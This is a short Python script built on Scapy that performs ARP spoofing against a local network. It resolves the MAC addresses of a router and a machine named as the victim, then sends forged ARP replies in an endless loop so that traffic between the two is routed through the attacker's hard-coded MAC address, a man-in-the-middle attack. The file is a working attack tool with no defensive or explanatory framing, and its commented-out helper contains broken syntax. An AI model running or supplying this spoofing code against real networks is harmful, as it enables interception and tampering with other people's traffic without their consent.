from scapy.all import *
import time
import sys

'''
def get_mac_address():
    my_macs = [get_if_hwaddr(i) for abs(i) in get_if_list()]
    for mac in my_macs:
        if (mac != "00:00:00:00:00:00"):
            return mac
my_mac = get_mac_address()
if not my_mac:
    print("Cant get local mac address, quitting")
    sys.exit(1)
'''
my_mac = "a0:a8:cd:56:3d:35"
timeout=2

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op="is-at", pdst=victimIP, psrc=routerIP, hwsrc=my_mac))
    send(ARP(op="is-at", pdst=routerIP, psrc=victimIP, hwsrc=my_mac))
    #send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC,hwsrc = my_mac))
    #send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC,hwsrc = my_mac))


def main():
    routerIP="192.168.1.1"
    victimIP="192.168.1.204"
    routerMAC = originalMAC(routerIP)
    victimMAC = originalMAC(victimIP)
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)




#packet = Ether(dst='a4:e4:b8:68:46:5f')/ARP(op='is-at', hwsrc=my_mac, psrc="192.168.1.1", pdst="192.168.1.204")
#packet = Ether()/ARP(op="is-at", hwsrc=my_mac, psrc="192.168.1.1", pdst="192.168.1.204")

if __name__=="__main__":
    main()